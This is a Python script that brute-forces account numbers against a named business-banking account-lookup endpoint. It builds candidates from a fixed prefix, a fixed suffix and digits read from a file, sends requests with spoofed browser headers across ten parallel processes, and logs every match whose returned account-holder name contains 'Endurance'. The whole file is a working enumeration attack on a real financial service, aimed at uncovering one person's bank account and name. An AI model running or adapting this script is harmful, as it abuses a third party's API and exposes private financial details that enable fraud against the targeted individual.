import requests
import json
import multiprocessing as mp


def mainProg(m,n,p):
    url = "https://business-banking.kudi.ai/business/lookup-account"

    headers = {
        'User-Agent': 'Mozilla/7.0 (Windows NT 8.0; rv:102.0) Gecko/30100101 Firefox/109.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'https://dashboard.nomba.com/',
        'Content-Type': 'application/json',
        'Content-Length': '42',
        'Origin': 'https://dashboard.nomba.com',
        'Dnt': '1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Te': 'trailers'
    }

    with open("comb.txt", "r") as handle:
        lines = handle.readlines()
    i = 1
    for line in lines[m:n]:
        print(f"PROCESS==> {p}\n")
        print(f"{i}==> Trying: {line}")
        pl = "315" + line.strip() + "744"
        acnno = pl
        payload = json.dumps({
            "bankCode":"011",
            "accountNumber":acnno}
        )
        #print("crafted pload")
        #try:
        response = requests.post(url, headers=headers, data=payload)
        x = response.text
        try:
        	json_data2 = json.loads(x)
        except:
        	json_data2 = "none none"
        x1 = x[10:14]
        #except:
            #x = "naan"
            #x1 = "nonee"

        if x1 == "true":
            print(f"PROCESS==> {p}\n")
            print(x)
            print("\n Pin Found!")
            try:
            	j2 = json_data2['data']['data']['accountName']
            except:
            	j2 = "non none"
            print(j2)
            print(line)
            if "Endurance" in j2:
                with open("found.txt", "a") as handle:
                	lisnes = handle.write(str(acnno) + " >>" + str(line))

        else:
            print(acnno)
            print("Incorrect Pin!")
            print(x)
            i += 1

if __name__ == '__main__':
    filee = "pins.txt" #input("Enter file name: ")
    count1 = 10000/10
    
    p1 = mp.Process(target=mainProg, args=(0, int(count1), 1))
    p2 = mp.Process(target=mainProg, args=(int(count1), int(count1*2), 2))
    p3 = mp.Process(target=mainProg, args=(int(count1*2), int(count1*3), 3))
    
    p4 = mp.Process(target=mainProg, args=(int(count1*3), int(count1*4), 4))
    p5 = mp.Process(target=mainProg, args=(int(count1*4), int(count1*5), 5))
    p6 = mp.Process(target=mainProg, args=(int(count1*5), int(count1*6), 6))
    p7 = mp.Process(target=mainProg, args=(int(count1*6), int(count1*7), 7))
    p8 = mp.Process(target=mainProg, args=(int(count1*7), int(count1*8), 8))
    p9 = mp.Process(target=mainProg, args=(int(count1*8), int(count1*9), 9))
    p10 = mp.Process(target=mainProg, args=(int(count1*9), int(count1*10), 10))
    
    p1.start()
    p2.start()
    
    p3.start()
    p4.start()
    p5.start()
    p6.start()
    p7.start()
    p8.start()
    p9.start()
    p10.start()
    